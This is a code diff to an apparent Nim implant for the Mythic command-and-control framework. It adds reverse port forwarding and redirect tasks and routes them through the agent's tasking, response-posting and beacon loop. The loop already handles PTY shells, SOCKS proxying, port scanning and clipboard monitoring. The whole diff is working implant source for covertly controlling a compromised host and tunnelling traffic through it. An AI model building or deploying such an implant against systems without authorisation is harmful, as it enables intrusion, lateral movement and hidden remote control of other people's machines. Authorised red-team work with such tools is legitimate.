@@ -23,6 +23,8 @@ import tasks/pwd
 import tasks/rm
 import tasks/pty
 import tasks/socks
+import tasks/rpfwd
+import tasks/redirect
 import tasks/getenv as taskGetenv
 
 # Cross-platform commands
@@ -275,9 +277,9 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode]] =
+proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
   ## Get tasking from Mythic
-  ## Returns tasks, interactive messages, and socks messages
+  ## Returns tasks, interactive messages, socks messages, and rpfwd messages
   let getTaskingMsg = %*{
     "action": "get_tasking",
     "tasking_size": -1
@@ -286,11 +288,12 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
   
   if response.len == 0:
-    return (@[], @[], @[])
+    return (@[], @[], @[], @[])
   
   var tasks: seq[JsonNode] = @[]
   var interactive: seq[JsonNode] = @[]
   var socks: seq[JsonNode] = @[]
+  var rpfwd: seq[JsonNode] = @[]
   
   try:
     let respJson = parseJson(response)
@@ -310,11 +313,16 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
       if agent.config.debug:
         echo "[DEBUG] Received ", socks.len, " socks message(s)"
     
-    return (tasks, interactive, socks)
+    if respJson.hasKey("rpfwd"):
+      rpfwd = respJson["rpfwd"].getElems()
+      if agent.config.debug:
+        echo "[DEBUG] Received ", rpfwd.len, " rpfwd message(s)"
+    
+    return (tasks, interactive, socks, rpfwd)
   except:
     if agent.config.debug:
       echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
-    return (@[], @[], @[])
+    return (@[], @[], @[], @[])
 
 
 
@@ -341,6 +349,18 @@ proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
     for response in responses:
       # Wrap each SOCKS message in the format expected by postResponses
       agent.taskResponses.add(%*{"socks": [response]})
+
+proc processRpfwd*(agent: var Agent, rpfwdMessages: seq[JsonNode]) =
+  ## Process RPfwd messages (data forwarding from Mythic)
+  if rpfwdMessages.len > 0:
+    if agent.config.debug:
+      echo "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s)"
+    
+    # Handle all RPfwd messages and get responses to send back
+    let responses = handleRpfwdMessages(rpfwdMessages)
+    for response in responses:
+      # Wrap each RPfwd message in the format expected by postResponses
+      agent.taskResponses.add(%*{"rpfwd": [response]})
 
 proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
   ## Process received tasks
@@ -877,6 +897,21 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           agent.taskResponses.add(response)
           continue
       
+      of "rpfwd":
+        if agent.config.debug:
+          echo "[DEBUG] Executing rpfwd command"
+        response = rpfwd(taskId, params)
+        # RPfwd sessions don't complete immediately
+        if response.hasKey("status") and response["status"].getStr() == "processing":
+          agent.taskResponses.add(response)
+          continue
+      
+      of "redirect":
+        if agent.config.debug:
+          echo "[DEBUG] Executing redirect command"
+        response = redirect(taskId, params)
+        # Redirect completes immediately (runs entirely in background threads)
+      
       of "portscan":
         if agent.config.debug:
           echo "[DEBUG] Starting portscan (background task)"
@@ -1033,10 +1068,11 @@ proc postResponses*(agent: var Agent) =
     echo "[DEBUG] === POSTING RESPONSES ==="
     echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
-  # Separate interactive and socks messages from regular responses
+  # Separate interactive, socks, and rpfwd messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
   var interactiveMessages: seq[JsonNode] = @[]
   var socksMessages: seq[JsonNode] = @[]
+  var rpfwdMessages: seq[JsonNode] = @[]
   
   for resp in agent.taskResponses:
     if resp.hasKey("interactive"):
@@ -1058,6 +1094,12 @@ proc postResponses*(agent: var Agent) =
       for msg in messages:
         socksMessages.add(msg)
       # Don't add the socks wrapper to responses
+    elif resp.hasKey("rpfwd"):
+      # Extract rpfwd messages and add to top-level array
+      let messages = resp["rpfwd"].getElems()
+      for msg in messages:
+        rpfwdMessages.add(msg)
+      # Don't add the rpfwd wrapper to responses
     else:
       regularResponses.add(resp)
   
@@ -1074,6 +1116,10 @@ proc postResponses*(agent: var Agent) =
   # Add socks messages at top level if any
   if socksMessages.len > 0:
     postMsg["socks"] = %socksMessages
+  
+  # Add rpfwd messages at top level if any
+  if rpfwdMessages.len > 0:
+    postMsg["rpfwd"] = %rpfwdMessages
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
@@ -1361,14 +1407,17 @@ proc runAgent*() =
   
   # Main agent loop
   while not agentInstance.shouldExit:
-    # Get tasking from Mythic (returns tasks, interactive, and socks messages)
-    let (tasks, interactive, socksMessages) = agentInstance.getTasks()
+    # Get tasking from Mythic (returns tasks, interactive, socks, and rpfwd messages)
+    let (tasks, interactive, socksMessages, rpfwdMessages) = agentInstance.getTasks()
     
     # Process interactive messages first (PTY input)
     agentInstance.processInteractive(interactive)
     
     # Process SOCKS messages (data forwarding)
     agentInstance.processSocks(socksMessages)
+    
+    # Process RPfwd messages (data forwarding)
+    agentInstance.processRpfwd(rpfwdMessages)
     
     # Process tasks
     agentInstance.processTasks(tasks)
@@ -1382,6 +1431,11 @@ proc runAgent*() =
     let socksResponses = checkActiveSocksConnections()
     for response in socksResponses:
       agentInstance.taskResponses.add(%*{"socks": [response]})
+    
+    # Check active RPfwd connections for data (non-blocking via threads)
+    let rpfwdResponses = checkActiveRpfwdConnections()
+    for response in rpfwdResponses:
+      agentInstance.taskResponses.add(%*{"rpfwd": [response]})
     
     # Check background tasks (clipboard_monitor, portscan)
     agentInstance.checkBackgroundTasks()
